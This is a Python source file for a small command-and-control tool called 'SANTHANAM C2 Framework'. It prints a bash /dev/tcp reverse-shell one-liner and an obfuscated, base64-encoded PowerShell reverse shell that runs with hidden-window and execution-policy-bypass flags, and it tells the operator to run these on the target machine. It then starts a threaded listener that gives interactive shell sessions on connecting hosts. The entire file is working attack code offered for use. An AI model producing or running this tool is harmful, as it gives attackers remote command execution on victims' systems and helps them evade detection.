import argparse
import socket
import threading
import base64



def display_banner():
    banner = """
    ███████╗ █████╗ ███╗   ██╗████████╗██╗  ██╗ █████╗ ███╗   ███╗
    ██╔════╝██╔══██╗████╗  ██║╚══██╔══╝██║  ██║██╔══██╗████╗ ████║
    █████╗  ███████║██╔██╗ ██║   ██║   ███████║███████║██╔████╔██║
    ██╔══╝  ██╔══██║██║╚██╗██║   ██║   ██╔══██║██╔══██║██║╚██╔╝██║
    ██║     ██║  ██║██║ ╚████║   ██║   ██║  ██║██║  ██║██║ ╚═╝ ██║
    ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═══╝   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝
                            SANTHANAM C2 Framework
    """
    print(f"\033[1;32m{banner}\033[0m")


# Generate Reverse Shell Payloads
def generate_reverse_shell(listener_ip, listener_port):
    # Standard Bash Reverse Shell
    bash_reverse_shell = f"bash -i >& /dev/tcp/{listener_ip}/{listener_port} 0>&1"

    # PowerShell Reverse Shell (Obfuscated & Encoded)
    powershell_script = f"""
    $e=New-Object System.Text.ASCIIEncoding;$n=New-Object System.Net.Sockets.TCPClient('{listener_ip}',{listener_port});
    $s=$n.GetStream();[byte[]]$b=0..65535|%{{0}};while(($r=$s.Read($b,0,$b.Length)) -ne 0){{
    $d=$e.GetString($b,0,$r);$r=(iex $d 2>&1|Out-String);$r2=$r+"PS "+(pwd).Path+"> ";$sb=$e.GetBytes($r2);$s.Write($sb,0,$sb.Length)}};$n.Close()
    """
    # Encode PowerShell script in Base64
    encoded_script = base64.b64encode(powershell_script.encode("utf-16le")).decode()
    powershell_reverse_shell = f"powershell -NoP -NonI -W Hidden -Exec Bypass -Enc {encoded_script}"

    print(f"\n\033[1;34mGenerated Reverse Shell Commands:\033[0m")
    print(f"\n\033[1;32mBash Reverse Shell:\033[0m\n{bash_reverse_shell}")
    print(f"\n\033[1;32mPowerShell Reverse Shell (Obfuscated & Encoded):\033[0m\n{powershell_reverse_shell}")
    print("\nRun these commands on the target machine to establish a reverse shell connection.")


# Handle Reverse Shell Connection
def handle_reverse_shell(client_socket, address):
    print(f"\n[+] Reverse shell session established from {address}")
    try:
        while True:
            command = input(f"Shell@{address}> ")
            if command.lower() in ["exit", "quit"]:
                print("[!] Closing the session.")
                client_socket.send(b"exit\n")
                break
            client_socket.send((command + "\n").encode())
            response = client_socket.recv(4096).decode()
            print(response, end="")
    except Exception as e:
        print(f"[!] Error: {e}")
    finally:
        client_socket.close()


# Start the Listener
def start_listener(port):
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind(('0.0.0.0', port))
    server_socket.listen(5)
    print(f"\n[+] Listener started on port {port}. Waiting for reverse shell connections...")

    while True:
        client_socket, address = server_socket.accept()
        threading.Thread(target=handle_reverse_shell, args=(client_socket, address)).start()


# Argument Parsing
def parse_arguments():
    parser = argparse.ArgumentParser(description="SANTHANAM C2 Framework")
    parser.add_argument(
        "--port", type=int, default=4444, help="Port for the listener to accept connections (default: 4444)"
    )
    return parser.parse_args()


# Main Function
def main():
    display_banner()
    args = parse_arguments()

    listener_ip = input("[*] Enter your IP address for the reverse shell listener: ").strip()
    listener_port = args.port

    print(f"\n[*] Listener will start on {listener_ip}:{listener_port}.")
    generate_reverse_shell(listener_ip, listener_port)

    try:
        start_listener(listener_port)
    except KeyboardInterrupt:
        print("\n[!] Listener shutting down...")
    except Exception as e:
        print(f"[!] Error: {e}")


if __name__ == "__main__":
    main()
